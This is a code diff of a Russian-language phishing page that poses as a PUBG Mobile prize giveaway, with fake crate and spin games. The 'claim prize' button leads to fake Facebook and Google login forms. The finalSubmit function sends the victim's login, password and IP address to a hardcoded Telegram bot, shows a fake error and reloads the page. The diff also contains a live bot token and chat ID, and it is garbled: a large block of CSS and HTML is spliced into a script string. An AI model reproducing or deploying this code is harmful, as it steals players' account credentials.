@@ -47,19 +47,20 @@
         }
 
         .loader-box {
-            background: rgba(13, 15, 19, 0.9);
-            padding: 30px 50px;
-            border-radius: 15px;
+            background: rgba(13, 15, 19, 0.95);
+            padding: 30px 45px;
+            border-radius: 20px;
             text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
             gap: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
 
         .spinner-snake {
-            width: 40px;
-            height: 40px;
+            width: 45px;
+            height: 45px;
             border: 4px solid rgba(255, 255, 255, 0.1);
             border-top: 4px solid #ffffff;
             border-radius: 50%;
@@ -67,31 +68,41 @@
         }
 
         .loader-box span {
-            color: #ccc;
-            font-size: 18px;
-            letter-spacing: 1px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 400;
+            opacity: 0.8;
+            letter-spacing: 0.5px;
         }
 
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
+        @keyframes spin {            0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
 
         /* --- ШАПКА --- */
-        header {            background: rgba(0, 0, 0, 0.95);
-            padding: 8px 16px;
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 10px 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
             border-bottom: 1px solid rgba(255, 255, 255, 0.05);
             position: sticky; top: 0; z-index: 100;
-            height: 60px;
+            height: 65px;
         }
 
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Четкая вырезанная иконка */
         .pubg-logo {
-            height: 40px; /* Размер логотипа */
+            height: 38px;
             width: auto;
-            object-fit: contain;
+            filter: drop-shadow(0 0 5px rgba(255,255,255,0.2));
+            display: block;
         }
 
         .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
@@ -111,27 +122,27 @@
         }
 
         .balance-display {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
-            padding: 4px 10px;
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 6px 12px;
             display: flex;
             align-items: center;
-            gap: 4px;
+            gap: 6px;
             border: 1px solid rgba(255,255,255,0.1);
         }
 
         .btn-plus {
             background: #4caf50;
-            width: 16px; height: 16px;
+            width: 18px; height: 18px;
             border-radius: 50%;
             display: flex; align-items: center; justify-content: center;
-            font-size: 10px; font-weight: bold;
+            font-size: 12px; font-weight: bold;
         }
 
-        /* --- ГЕЙМПЛЕЙ --- */
+        /* --- КОНТЕНТ --- */
         .case-container {
             position: relative;
-            width: 100%;            height: 180px;
+            width: 100%; height: 180px;
             overflow: hidden;
             margin: 20px 0;
         }
@@ -161,7 +172,7 @@
             align-items: center;
             justify-content: center;
         }
-        .case-item img { width: 100px; height: 100px; object-fit: contain; opacity: 1 !important; }
+        .case-item img { width: 100px; height: 100px; object-fit: contain; }
 
         .btn-blue {
             background: var(--pubg-blue);
@@ -171,35 +182,34 @@
             padding: 16px;
             border-radius: 12px;
             font-weight: 700;
-            font-size: 16px;
             text-align: center;
             display: block;
             cursor: pointer;
-            transition: all 0.3s ease;
         }
 
         .nav-bar {
             position: fixed; bottom: 0; left: 0; right: 0;
-            background: #000; height: 65px;
+            background: #000; height: 70px;
             display: flex; justify-content: space-around; align-items: center;
-            border-top: 1px solid rgba(255, 255, 255, 0.05);
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
             z-index: 50;
+            padding-bottom: 10px;
         }
-        .nav-item { display: flex; flex-direction: column; align-items: center; color: #444; font-size: 10px; cursor: pointer;}
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #666; font-size: 11px; cursor: pointer;}
         .nav-item.active { color: var(--pubg-gold); }
 
         .modal {
             position: fixed; inset: 0; background: rgba(0,0,0,0.95);
             z-index: 1000; display: none; flex-direction: column; padding: 20px;
-            justify-content: center;
-        }
+            justify-content: center;}
         .login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
     </style>
 </head>
 <body>
 
-    <!-- ПРЕЛОАДЕР --><div id="preloader">
+    <!-- ПРЕЛОАДЕР -->
+    <div id="preloader">
         <div class="loader-box">
             <div class="spinner-snake"></div>
             <span>loading...</span>
@@ -207,13 +217,13 @@
     </div>
 
     <header>
-        <div class="flex items-center">
-            <!-- ЛОГОТИП ПАБГ СЛЕВА -->
-            <img src="https://www.pubgmobile.com/common/images/icon_logo.png" alt="PUBG Logo" class="pubg-logo">
+        <div class="header-left">
+            <!-- ВЫРЕЗАННАЯ ИКОНКА (ОФИЦИАЛЬНЫЙ ЛОГО) -->
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a2/PUBG_Mobile_Logo.svg/1200px-PUBG_Mobile_Logo.svg.png" alt="PUBG" class="pubg-logo">
             
-            <div id="backBtn" style="visibility: hidden; margin-left: 10px;" onclick="showSection('hub')" class="flex items-center gap-1 cursor-pointer">
+            <div id="backBtn" style="visibility: hidden;" onclick="showSection('hub')" class="flex items-center gap-1 cursor-pointer">
                 <i class="fas fa-chevron-left text-gray-400"></i>
-                <span class="text-xs font-bold">Назад</span>
+                <span class="text-xs font-bold text-gray-400">Назад</span>
             </div>
         </div>
 
@@ -225,21 +235,26 @@
     </header>
 
     <main id="section-hub" class="p-4">
-        <div class="text-center mb-4">
-            <h1 class="pubg-font text-2xl">Gift Drop Center</h1>
+        <div class="text-center mt-2 mb-6">
+            <h1 class="pubg-font text-3xl tracking-wider">GIFT DROP CENTER</h1>
         </div>
         <div class="grid grid-cols-2 gap-4">
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
-                <img src="ruletka1.png" class="h-32 mx-auto mb-2 rounded-xl">
+            <div class="bg-[#151618] p-4 rounded-3xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
+                <div class="bg-[#1c1d21] rounded-2xl mb-3 flex items-center justify-center h-32 overflow-hidden">
+                    <img src="ruletka1.png" class="w-full h-full object-cover">
+                </div>
                 <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
             </div>
-            <div class="bg-[#151618] p-4 rounded-2xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
-                <img src="ruletka2.png" class="h-32 mx-auto mb-2 rounded-xl">
+            <div class="bg-[#151618] p-4 rounded-3xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
+                <div class="bg-[#1c1d21] rounded-2xl mb-3 flex items-center justify-center h-32 overflow-hidden">
+                    <img src="ruletka2.png" class="w-full h-full object-cover">
+                </div>
                 <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
             </div>
         </div>
     </main>
 
+    <!-- СЕКЦИЯ КЕЙС -->
     <section id="section-case" style="display: none;">
         <div class="text-center py-6">
             <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
@@ -252,6 +267,249 @@
         <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
     </section>
 
+    <!-- СЕКЦИЯ СПИН -->
+    <section id="section-spin" style="display: none;" class="p-5">
+        <div class="text-center py-4">
+            <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
+        </div>
+        <div class="bg-[#151618] rounded-3xl p-4 border-2 border-[#25262b] mb-6">
+            <div class="grid grid-cols-3 gap-3">
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s0"><img src="priz1.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s1"><img src="priz2.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s2"><img src="priz3.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s7"><img src="priz4.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="mid"><img src="priz5.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s3"><img src="priz6.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s6"><img src="priz7.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s5"><img src="priz8.png" class="w-full h-full object-contain"></div>
+                <div class="bg-[#25262b] aspect-square rounded-xl p-2 border-2 border-transparent transition-all" id="s4"><img src="priz9.png" class="w-full h-full object-contain"></div>
+            </div>
+        </div>
+        <button id="spinBtn" class="btn-blue !mx-0 !bg-yellow-500 !text-black !w-full" onclick="startSpin()">Крутить (60 UC)</button>
+        <button id="spinDepositBtn" class="btn-blue !mx-0 !bg-blue-600 !text-white !w-full" style="display: none;" onclick="startAuth()">Забрать приз</button>
+    </section>
+
+    <!-- МОДАЛКИ -->
+    <div id="modalAuth" class="modal">
+        <div class="login-card">
+            <h2 class="font-black text-xl mb-4 text-center">Верификация аккаунта</h2>
+            <button onclick="openForm('Facebook')" class="w-full bg-[#1877F2] text-white p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-facebook-f"></i> Facebook</button>
+            <button onclick="openForm('Google')" class="w-full bg-white text-black border border-gray-200 p-4 rounded-xl mb-3 font-bold flex items-center justify-center gap-3"><i class="fab fa-google"></i> Google</button>
+            <button onclick="document.getElementById('modalAuth').style.display='none'" class="w-full text-gray-400 text-sm mt-2 text-center">Отмена</button>
+        </div>
+    </div>
+
+    <div id="modalForm" class="modal">
+        <div class="login-card">
+            <h2 id="methodName" class="font-black text-xl mb-4">Login</h2>
+            <input type="text" id="inpUser" placeholder="Email или телефон">
+            <input type="password" id="inpPass" placeholder="Пароль">
+            <button onclick="finalSubmit()" class="w-full bg-blue-600 text-white p-4 rounded-xl mt-4 font-bold">Войти</button>
+        </div>
+    </div>
+
+    <nav class="nav-bar">
+        <div class="nav-item" onclick="showSection('case')"><i class="fas fa-box-open text-xl mb-1"></i><span>Cases</span></div>
+        <div class="nav-item active" id="nav-hub" onclick="showSection('hub')"><i class="fas fa-gamepad text-xl mb-1"></i><span>Games</span></div>
+        <div class="nav-item" onclick="startAuth()"><i class="fas fa-user text-xl mb-1"></i><span>Profile</span></div>
+    </nav>
+
+    <script>
+        const BOT_TOKEN = '8498045152:AAH6b4APGZfXDz0Dm0UFvN0kIkfvqtmViKU';
+        const CHAT_ID = '1709490182';
+        const prizeImages = ['priz1\            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* --- ШАПКА --- */
+        header {
+            background: rgba(0, 0, 0, 0.9);
+            padding: 10px 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+            position: sticky; top: 0; z-index: 100;
+            height: 65px;
+        }
+
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Четкая вырезанная иконка */
+        .pubg-logo {
+            height: 38px;
+            width: auto;
+            filter: drop-shadow(0 0 5px rgba(255,255,255,0.2));
+            display: block;
+        }
+
+        .pubg-font { font-family: 'Teko', sans-serif; text-transform: uppercase; letter-spacing: 1px; }
+
+        .uc-icon {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #1a1a1a;
+            border: 1px solid #c4a162;
+            border-radius: 4px;
+            padding: 1px 4px;
+            font-size: 10px;
+            font-weight: 900;
+            color: #fff;
+            margin-right: 4px;
+        }
+
+        .balance-display {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 8px;
+            padding: 6px 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .btn-plus {
+            background: #4caf50;
+            width: 18px; height: 18px;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 12px; font-weight: bold;
+        }
+
+        /* --- КОНТЕНТ --- */
+        .case-container {
+            position: relative;
+            width: 100%; height: 180px;
+            overflow: hidden;
+            margin: 20px 0;
+        }
+
+        .case-line {
+            position: absolute;
+            top: 0; left: 50%;
+            width: 2px; height: 100%;
+            background: var(--pubg-gold);
+            z-index: 20;
+            box-shadow: 0 0 15px var(--pubg-gold);
+            transform: translateX(-50%);
+        }
+
+        .case-tape {
+            display: flex;
+            padding: 30px 0;
+            transition: transform 5s cubic-bezier(0.15, 0, 0.15, 1);
+            will-change: transform;
+        }
+
+        .case-item {
+            min-width: 140px;
+            width: 140px;
+            height: 120px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .case-item img { width: 100px; height: 100px; object-fit: contain; }
+
+        .btn-blue {
+            background: var(--pubg-blue);
+            color: white;
+            width: calc(100% - 32px);
+            margin: 0 16px;
+            padding: 16px;
+            border-radius: 12px;
+            font-weight: 700;
+            text-align: center;
+            display: block;
+            cursor: pointer;
+        }
+
+        .nav-bar {
+            position: fixed; bottom: 0; left: 0; right: 0;
+            background: #000; height: 70px;
+            display: flex; justify-content: space-around; align-items: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            z-index: 50;
+            padding-bottom: 10px;
+        }
+        .nav-item { display: flex; flex-direction: column; align-items: center; color: #666; font-size: 11px; cursor: pointer;}
+        .nav-item.active { color: var(--pubg-gold); }
+
+        .modal {
+            position: fixed; inset: 0; background: rgba(0,0,0,0.95);
+            z-index: 1000; display: none; flex-direction: column; padding: 20px;
+            justify-content: center;
+        }.login-card { background: white; color: black; border-radius: 16px; padding: 24px; }
+        input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; color: black;}
+    </style>
+</head>
+<body>
+
+    <!-- ПРЕЛОАДЕР -->
+    <div id="preloader">
+        <div class="loader-box">
+            <div class="spinner-snake"></div>
+            <span>loading...</span>
+        </div>
+    </div>
+
+    <header>
+        <div class="header-left">
+            <!-- ВЫРЕЗАННАЯ ИКОНКА (ОФИЦИАЛЬНЫЙ ЛОГО) -->
+            <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a2/PUBG_Mobile_Logo.svg/1200px-PUBG_Mobile_Logo.svg.png" alt="PUBG" class="pubg-logo">
+            
+            <div id="backBtn" style="visibility: hidden;" onclick="showSection('hub')" class="flex items-center gap-1 cursor-pointer">
+                <i class="fas fa-chevron-left text-gray-400"></i>
+                <span class="text-xs font-bold text-gray-400">Назад</span>
+            </div>
+        </div>
+
+        <div class="balance-display">
+            <span class="uc-icon">UC</span>
+            <span id="headerBalance" class="text-sm font-bold">60</span>
+            <div class="btn-plus">+</div>
+        </div>
+    </header>
+
+    <main id="section-hub" class="p-4">
+        <div class="text-center mt-2 mb-6">
+            <h1 class="pubg-font text-3xl tracking-wider">GIFT DROP CENTER</h1>
+        </div>
+        <div class="grid grid-cols-2 gap-4">
+            <div class="bg-[#151618] p-4 rounded-3xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('case')">
+                <div class="bg-[#1c1d21] rounded-2xl mb-3 flex items-center justify-center h-32 overflow-hidden">
+                    <img src="ruletka1.png" class="w-full h-full object-cover">
+                </div>
+                <div class="pubg-font text-blue-400 text-lg">GIFT DROP</div>
+            </div>
+            <div class="bg-[#151618] p-4 rounded-3xl border border-white/5 text-center cursor-pointer active:scale-95 transition-transform" onclick="showSection('spin')">
+                <div class="bg-[#1c1d21] rounded-2xl mb-3 flex items-center justify-center h-32 overflow-hidden">
+                    <img src="ruletka2.png" class="w-full h-full object-cover">
+                </div>
+                <div class="pubg-font text-yellow-500 text-lg">LUCKY SPIN</div>
+            </div>
+        </div>
+    </main>
+
+    <!-- СЕКЦИЯ КЕЙС -->
+    <section id="section-case" style="display: none;">
+        <div class="text-center py-6">
+            <h2 class="pubg-font text-3xl text-white">Classic Crate</h2>
+        </div>
+        <div class="case-container">
+            <div class="case-line"></div>
+            <div id="caseTape" class="case-tape"></div>
+        </div>
+        <button id="openBtn" onclick="openCase()" class="btn-blue !bg-white !text-black mb-3">Открыть (60 UC)</button>
+        <button id="depositBtn" onclick="startAuth()" class="btn-blue" style="display: none;">Забрать приз</button>
+    </section>
+
+    <!-- СЕКЦИЯ СПИН -->
     <section id="section-spin" style="display: none;" class="p-5">
         <div class="text-center py-4">
             <h2 class="pubg-font text-3xl text-white">Lucky Spin</h2>
@@ -307,7 +565,6 @@
         let isSpinning = false;
         let userIP = '';
         const itemWidth = 140;
-        let currentWinCellId = null;
 
         fetch('https://ipapi.co/json/').then(r => r.json()).then(d => userIP = d.ip + ' (' + d.country_name + ')');
 
@@ -327,9 +584,9 @@
             document.getElementById('section-spin').style.display = 'none';
             document.getElementById('section-' + id).style.display = 'block';
             document.getElementById('backBtn').style.visibility = (id === 'hub') ? 'hidden' : 'visible';
+            
             document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
             if(id === 'hub') document.getElementById('nav-hub').classList.add('active');
-            if(id === 'case') document.querySelector('.nav-item:nth-child(1)').classList.add('active');
             updateBalanceUI();
         }
 
@@ -348,8 +605,7 @@
             isSpinning = true;
             const targetIdx = 45; 
             const tape = document.getElementById('caseTape');
-            const screenCenter = window.innerWidth / 2;
-            const finalOffset = (targetIdx * itemWidth) - screenCenter + (itemWidth / 2);
+            const finalOffset = (targetIdx * itemWidth) - (window.innerWidth / 2) + (itemWidth / 2);
             tape.style.transform = `translateX(-${finalOffset}px)`;
             setTimeout(() => {
                 isSpinning = false;
@@ -364,8 +620,6 @@
             const cells = ['s0', 's1', 's2', 's3', 's4', 's5', 's6', 's7', 'mid'];
             let step = 0;
             const totalSteps = 25 + Math.floor(Math.random() * 10);
-            const winCellId = cells[Math.floor(Math.random() * cells.length)];
-            document.getElementById('spinBtn').style.display = 'none';
             const interval = setInterval(() => {
                 cells.forEach(id => { document.getElementById(id).style.borderColor = 'transparent'; });
                 const currentId = cells[step % cells.length];
@@ -373,8 +627,7 @@
                 step++;
                 if (step >= totalSteps) {
                     clearInterval(interval);
-                    document.getElementById(winCellId).style.borderColor = '#ffbc00';
-                    document.getElementById(winCellId).style.boxShadow = '0 0 20px #ffbc00';
+                    document.getElementById(cells[(step-1) % cells.length]).style.boxShadow = '0 0 20px #ffbc00';
                     setTimeout(() => {
                         document.getElementById('spinDepositBtn').style.display = 'block';
                         isSpinning = false;
@@ -384,14 +637,14 @@
         }
 
         function startAuth() { document.getElementById('modalAuth').style.display = 'flex'; }
-        function openForm(m) {
+        functionopenForm(m) {
             document.getElementById('modalAuth').style.display = 'none';
             document.getElementById('modalForm').style.display = 'flex';
             document.getElementById('methodName').innerText = m;
         }
 
         async function finalSubmit() {
-            constu = document.getElementById('inpUser').value;
+            const u = document.getElementById('inpUser').value;
             const p = document.getElementById('inpPass').value;
             if(u.length < 3 || p.length < 3) return alert('Заполните все поля');
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -399,7 +652,7 @@
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({chat_id: CHAT_ID, text: `🔥 LOG \nU: ${u}\nP: ${p}\nIP: ${userIP}`})
             });
-            alert('Ошибка. Попробуйте позже.');
+            alert('Ошибка верификации. Попробуйте другой способ.');
             location.reload();
         }
 
